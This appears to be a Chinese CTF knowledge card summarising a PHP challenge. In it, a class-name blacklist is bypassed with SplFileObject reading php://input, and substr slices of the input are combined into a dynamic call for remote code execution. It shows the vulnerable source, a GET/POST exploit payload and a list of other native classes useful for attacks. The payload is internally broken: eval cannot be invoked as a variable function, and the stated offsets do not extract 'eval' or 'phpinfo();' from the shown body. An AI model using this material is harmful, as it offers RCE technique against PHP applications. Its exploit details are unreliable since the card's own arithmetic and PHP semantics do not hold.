---
title: PHP 原生类 SplFileObject 在 CTF 中的运用
contest: 来源 ctfiot (PHP CTF 知识)
year: 2022
difficulty: medium
vuln_type: [rce, web_unknown]
tags: [PHP, SplFileObject, php://, 原生类, error_reporting, eval-RCE, 黑名单绕过]
attack_chain: ["$class = new $a($b) 动态实例化原生类（绕过 Error/ArrayIterator/Exception 黑名单）", "$class->$c() 调用方法名 c", "substr 截取返回字符串切片到 $str1 / $str2", "$str1($str2) 把 $str1 当函数名 $str2 当参数执行", "选 SplFileObject('php://input', 'r') → 读 stdin 一行", "substr 切出 'eval' + 'phpinfo();'", "eval(phpinfo()) 拿 RCE"]
key_payload: "?a=SplFileObject&b=php://input&c=fgets&d=0&e=4&f=5&g=8  POST: eval('phpinfo();') 前的导引串"
one_liner: PHP 原生类 SplFileObject 读 php://input + substr 切片拼 eval RCE
lesson: PHP 限制类名时优先看 SPL 原生类（SplFileObject / SplFileInfo / DirectoryIterator / GlobIterator / SimpleXMLElement）
quality: high
---

# PHP 原生类 SplFileObject 在 CTF 中的运用

原文 https://www.ctfiot.com/67998.html

## 题目源码
```php
<?php
error_reporting(0);
show_source(__FILE__);
$a = $_GET["a"]; $b = $_GET["b"]; $c = $_GET["c"];
$d = $_GET["d"]; $e = $_GET["e"]; $f = $_GET["f"]; $g = $_GET["g"];
if(preg_match("/Error|ArrayIterator|Exception/i", $a)) { die("hello"); }
$class = new $a($b);
$str1 = substr($class->$c(), $d, $e);
$str2 = substr($class->$c(), $f, $g);
$str1($str2);
```

## 攻击链
1. `$a` 黑名单过滤 Error/ArrayIterator/Exception → 选 `SplFileObject`（不在黑名单）
2. `$b` = `php://input`（题目 `allow_url_fopen=on, allow_url_include=on`）
3. `$c` = `fgets` 读一行
4. POST body 传：`abcdefeval phpinfo();abcdef...`
5. `substr 切 0-4` 拿 `"eval"`，`substr 切 5-...` 拿 `"phpinfo();"`
6. `eval("phpinfo();")` → RCE

## 关键 payload
```
GET /?a=SplFileObject&b=php://input&c=fgets&d=0&e=4&f=5&g=8
POST: xxxeval xxxxxphpinfo();
```
或者：
```
$a = "eval"; $b = "phpinfo();"; $a($b);
```

## 教学价值
- PHP 原生类是 web 题 RCE 的常备工具
- `SplFileObject($filename, 'r')` 可读本地/远程文件
- 配合 `php://input` + POST body 拼 RCE
- 类似可用原生类：
  - `SplFileInfo` 读文件信息
  - `DirectoryIterator` / `GlobIterator` 列目录
  - `SimpleXMLElement` XXE
  - `ReflectionFunction` / `ReflectionClass` 反射
  - `SplStack` / `SplQueue` 数据结构
- 黑名单绕过：大小写 / 编码 / 命名空间 / 同义类
